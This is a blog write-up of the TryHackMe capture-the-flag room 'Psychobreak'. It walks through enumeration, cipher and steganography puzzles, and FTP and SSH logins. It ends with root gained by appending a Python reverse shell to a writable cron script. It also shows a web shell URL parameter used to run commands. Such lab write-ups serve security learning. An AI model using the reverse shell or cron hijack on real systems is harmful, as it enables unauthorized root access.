---
layout: post
title: Psychobreak
date: 2020-11-14 19:00:00 +0000
category: [Tryhackme, Easy]
tags: [thm,linux,easy,puzzle]
---

---
<p>Psycho Break is a TryHackMe room which is based on the video game “The Evil Within”. The objective is to get the user flag and the root flag.</p>
<br>
![cover_image](/assets/img/tryhackme/psychobreak/1.png)

**Author** | Shafdo
**Description** | Help Sebastian and his team of investigators to withstand the dangers that come ahead

<p>
Deploy the VM and let's go...
First up is enumeration</p>

## <ins>Task 1</ins>
---
<br>
![nmap_scan](/assets/img/tryhackme/psychobreak/nmap.PNG)
<br>
<p>A simple nmap scan would give the answers to the first task. So I tried to login to the ftp service. Anonymous login is not enabled in ftp service. So let’s move on to http.</p>


## <ins>Task 2</ins>
---
<br>
![http_service](/assets/img/tryhackme/psychobreak/3.png)
![room_hint](/assets/img/tryhackme/psychobreak/4.png)
<br>
<p>In the source page we can find the room name. Let’s go into the room.</p>

<br>
![Sadist_room](/assets/img/tryhackme/psychobreak/5.png)
<br>
<p>We can get the key to the locker room by clicking the given link. But wait… seconds after clicking the link the the background changes and a alert box asking for the key pops up.</p>

<br>
![second_sadist_room](/assets/img/tryhackme/psychobreak/6.png)
<br>
<p>After entering the key, we can see the locker room page. After looking at the link to the map, it seems we need to decode the piece of text to get the map.</p>

<br>
![Locker_room](/assets/img/tryhackme/psychobreak/7.png)
<br>
At first I thought it was rot13 encoded but I was wrong. Go the link [vigenere-solver](https://www.guballa.de/vigenere-solver) and choose the correct variant given in the image to decode the text.

<br>
![decode](/assets/img/tryhackme/psychobreak/8.png)
<br>
<p>After decoding, enter the decoded text to get access to map. Let’s move on to the next room…</p>

<br>
![Safe_haven](/assets/img/tryhackme/psychobreak/11.png)
<br>
<p>In the source code of the page we can find a hint.</p>

<br>
![Safe_haven_hint](/assets/img/tryhackme/psychobreak/12.png)
<br>
<p>I had a hard time in this part. I tried enumerating using various methods but it took me more than a hour to finally find this.</p>

<pre>gobuster dir -u http://ip-address/ -w /usr/share/dirb/wordlist/medium.txt -x php,txt,js,html -t 100 </pre>

use gobuster with the medium wordlist to find the hidden directory.

![The_keeper](/assets/img/tryhackme/psychobreak/14.png)
After clicking on the link we are redirected to another page.

![Save_yourself](/assets/img/tryhackme/psychobreak/15.png)
A simple google image search would tell the answer right away. And we’ll get the keeper’s key. So let’s go to the final room given in the map.

![Abandoned_room](/assets/img/tryhackme/psychobreak/18.png)
After clicking on the link, it redirects to another page.

![Spiderlady](/assets/img/tryhackme/psychobreak/19.png)
After looking at the source page, I found a hint which told that the keyword “shell” would be useful. So, I tried appending it to the end of the url but there was no response. Finally, after setting it with value, it responds….

<br>
<pre>http://ip-address/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls .. </pre>

![dir_list](/assets/img/tryhackme/psychobreak/21.png)
I downloaded the two files after moving into the other directory that was returned in the response.

## <ins>Task 3</ins>
---

The text file is just a message so I extracted the zip file. Extract the contents of the image file using binwalk since it was corrupted.

<pre>binwalk -e image.jpg</pre>
After listening to the .wav file I found that it was morse code. So, I decrypted using [Morse Decoders](https://morsecode.world/international/decoder/audio-decoder-expert.html).

![sound_file_decryption](/assets/img/tryhackme/psychobreak/27.png)
Using the message that is decrypted  to extract the contents of the other image file with steghide.

<pre>steghide --extract -sf image_file.jpg</pre>
The text file gives the ftp credentials. Let’s login to ftp…

![FTP_creds](/assets/img/tryhackme/psychobreak/28.png)

## <ins>Task 4</ins>
---

I found two files in the ftp server and I downloaded using the get command.

<pre>get file-name</pre>
![program](/assets/img/tryhackme/psychobreak/30.png)

After running the program file I found that it takes a word as a argument. So, I ran the bash script.

<pre>
for i in $(cat list.dic);
do
./program $i;
done
</pre>

![program_decryption](/assets/img/tryhackme/psychobreak/31.png)
There is another bunch of numbers given to be decoded. This is multitap phone cipher. It can be cracked using [dcode]().


## <ins>Task 5</ins>
---

The decoded text is the SSH password. Without further wait, let’s login to ssh.

![ssh_login](/assets/img/tryhackme/psychobreak/34.png)
We found the user.txt in the home directory and some other hidden files

![ssh_hidden_dirs](/assets/img/tryhackme/psychobreak/35.png)
After reading the .readThis.txt file, it seems there is a file with the name the_eye_of_ruvik. So, I checked the /etc/crontab and I was right, there is a file named .the_eye_of_ruvik.py that runs as root for very 30 secs and whats more is we can edit the file.

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

So, I appended the python reverse shell in the file and opened a netcat listener in my local machine. After a few seconds I got the reverse shell.

![root_flag](/assets/img/tryhackme/psychobreak/39.png)
We also got the root flag.

## Bonus
---

![bonus_flag](/assets/img/tryhackme/psychobreak/40.png)

The bonus task is to delete the user ruvik

<pre>userdel -r ruvik</pre>
Run this as root

That’s it folks. Happy Hacking!!!
